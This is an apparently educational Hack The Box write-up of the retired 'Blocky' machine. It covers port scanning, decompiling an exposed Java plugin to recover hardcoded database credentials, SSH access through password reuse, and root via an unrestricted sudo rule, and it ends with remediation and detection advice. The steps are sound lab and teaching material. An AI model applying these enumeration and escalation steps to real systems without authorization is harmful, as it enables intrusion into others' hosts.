---
title: "Blocky — Exposed Plugin Credentials and Unrestricted Sudo"
description: "Web enumeration exposes a custom Java plugin; decompilation reveals hardcoded database credentials later reused for SSH, and an unrestricted sudo policy yields root."
type: case-study
platform: Hack The Box
content_type: machine
status: published-ready
addedAt: "2026-09-14"
tags:
  - linux
  - web
  - credential-management
  - sudo
objective: "Move from an exposed Java plugin's hardcoded database credentials to SSH access through credential reuse, then escalate through an unrestricted sudo policy."
tools:
  - rustscan
  - feroxbuster
  - jadx
  - ssh
  - sudo
skill: "Credential recovery from exposed application source and Linux privilege escalation through permissive sudo"
outcome: "SSH access as the WordPress service account and root command execution through an unrestricted sudo policy"
---

## At a glance

| Field | Value |
|---|---|
| Difficulty | Easy |
| Target environment | Ubuntu Linux; Apache httpd 2.4.18 serving WordPress 4.8 |
| Starting position | Unauthenticated network access |
| Objective | Move from an exposed Java plugin's hardcoded database credentials to SSH access through credential reuse, then escalate through an unrestricted sudo policy |
| Outcome | SSH access as `<LAB_USER>` and root command execution through the account's unrestricted `sudo` policy |

## From a browsable plugin to unrestricted sudo

Blocky is an Easy Hack The Box Linux lab themed around a Minecraft server. Web content discovery exposes a non-standard `/plugins` directory holding Java plugin archives; decompiling the custom plugin reveals hardcoded database credentials, and those credentials authenticate to an exposed phpMyAdmin instance and disclose the WordPress user account. The same password is reused for SSH, and the account holds an unrestricted `sudo` policy. Target identifiers, credentials, and secret values are replaced with role-based placeholders; command syntax is preserved. See [how evidence is handled](/method/).

**Attack path:** **Exposed `/plugins` directory → decompiled `BlockyCore.jar` → hardcoded database credentials → phpMyAdmin account discovery → SSH through credential reuse → unrestricted `sudo` → root**

## Target, web application, and objective

- **Target:** Ubuntu Linux host exposing FTP, SSH, HTTP, and a Minecraft service.
- **Web application:** Apache httpd 2.4.18 serving a WordPress 4.8 site.
- **Starting position:** unauthenticated network access.
- **Objective:** turn exposed plugin source into operating-system access, then determine the authenticated account's privilege boundary.
- **Constraints:** all activity stayed inside the Hack The Box lab environment.

## Evidence: plugin archive to root sudo

### 1. Service Enumeration

Observation: a full-port scan exposes four services, and the web application is the most useful entry point.

```bash
rustscan -a <TARGET_IP> --ulimit 5000 -- -Pn -sC -sV -oN <SCAN_OUTPUT>
```

Truncated scan output:

```text
21/tcp    open  ftp?
22/tcp    open  ssh       OpenSSH 7.2p2 Ubuntu 4ubuntu2.2
80/tcp    open  http      Apache httpd 2.4.18
|_http-title: BlockyCraft - Under Construction!
|_http-generator: WordPress 4.8
25565/tcp open  minecraft Minecraft 1.11.2
```

Significance: the HTTP banner identifies a WordPress deployment, so I expected content discovery to expose application structure beyond the rendered site; the SSH version confirms a Linux host.

Result: the scan exposes SSH, HTTP, and Minecraft, and the HTTP response identifies a WordPress 4.8 deployment served by Apache 2.4.18.

### 2. Web Content Discovery

Observation: content discovery against the WordPress site returns administrative and plugin paths.

```bash
feroxbuster --url http://<DOMAIN> --wordlist <WEB_CONTENT_WORDLIST> -n
```

Truncated discovery output:

```text
/wp-admin
/phpmyadmin
/plugins
```

The `/plugins` directory contains Java archives:

```text
BlockyCore.jar
griefprevention-1.11.2-3.1.1.298.jar
```

Significance: `/plugins` is a non-standard, browsable path that exposes custom application artifacts, and Java archives can disclose implementation details beyond what the browser renders.

Result: a custom `BlockyCore.jar` plugin archive is reachable without authentication.

### 3. Plugin Decompilation and Credential Recovery

Observation: decompiling the custom plugin exposes hardcoded database credentials in its source.

```bash
jadx <PLUGIN_ARCHIVE>
```

```java
this.sqlUser = "<DATABASE_USER>";
this.sqlPass = "<DATABASE_PASSWORD>";
```

Significance: Java archives are source-disclosable, so a standard decompiler can read credentials embedded in a reachable plugin.

Result: a database credential pair is recovered from the plugin source.

### 4. Database Access and Account Discovery

Observation: the recovered database credential was used against the exposed phpMyAdmin instance; the notes report a successful login that exposed the WordPress database, including the `wp_users` table.

```text
<DATABASE_USER> : <DATABASE_PASSWORD>
```

```text
wp_users:
<LAB_USER>
$P$<HASH_REDACTED>
```

Significance: the database discloses the WordPress account name and confirms the database credential. The password hash was not needed because the password is reused by the system account.

Result: the WordPress account `<LAB_USER>` is identified, and its password hash is not required for the next step.

### 5. SSH Access through Credential Reuse

Observation: the database credential is also the system account's password, so the recovered secret crosses from the application to the operating system.

```bash
ssh <LAB_USER>@<TARGET_IP>
```

```text
<LAB_USER>@<HOST>:~$
```

Significance: a credential disclosed by application source gives direct host access because the database and operating-system accounts share the same secret.

Result: an authenticated SSH shell is obtained as `<LAB_USER>`.

### 6. Privilege Escalation through Unrestricted Sudo

Observation: the authenticated account may run every command as every user.

```bash
sudo -l
```

```text
User <LAB_USER> may run the following commands on <HOST>:
    (ALL : ALL) ALL
```

Action:

```bash
sudo su -
whoami
```

```text
root
```

Significance: `(ALL : ALL) ALL` removes meaningful privilege separation, so the account can assume `root` directly through `sudo`.

Result: an administrative shell is established, and `whoami` returns `root`.

## Challenges and Decisions

No other obstacles or failed attempts affected this path.

## Outcome: SSH via a reused credential, root via sudo

An authenticated SSH session as `<LAB_USER>` was reached through a credential recovered from an exposed plugin archive and reused across the database and host. The account's unrestricted `sudo` policy then provided a root context. The recovered password hash was not required for the path.

## Recommendations: exposed plugin, credential reuse, and unrestricted sudo

The following actions are recommendations. No validation is documented.

1. **Exposed plugin directory with embedded credentials.** `/plugins` was reachable without authentication, and its Java archives contained hardcoded database credentials that yielded application and host access. *Recommendation:* keep build and development artifacts out of the web root, keep plugin directories non-browsable, and store secrets in a managed secret store instead of in source. *Detection:* inspect web-root archive requests and scan deployed artifacts for credential patterns.
2. **Credential reuse across trust boundaries.** The same password authenticated to the database and the system account, so one source disclosure crossed from application to operating system. *Recommendation:* issue unique credentials per service and system account, and rotate any value exposed in source. *Detection:* correlate successful SSH authentication with known service credentials or unexpected source locations.
3. **Unrestricted sudo policy.** `(ALL : ALL) ALL` let the account run any command as any user, so privilege escalation was a single command. *Recommendation:* scope `sudoers` rules to specific commands and arguments under least privilege. *Validation:* review `sudo -l` output and audit `sudoers` for blanket `ALL` grants.

## References

- [Hack The Box — Blocky](https://app.hackthebox.com/machines/Blocky) (retired machine)
- [RustScan](https://github.com/bee-san/RustScan) (fast port scanner)
- [feroxbuster](https://github.com/epi052/feroxbuster) (content discovery)
- [jadx](https://github.com/skylot/jadx) (Java and Dalvik decompiler)
- [sudo](https://www.sudo.ws/) (privilege delegation)
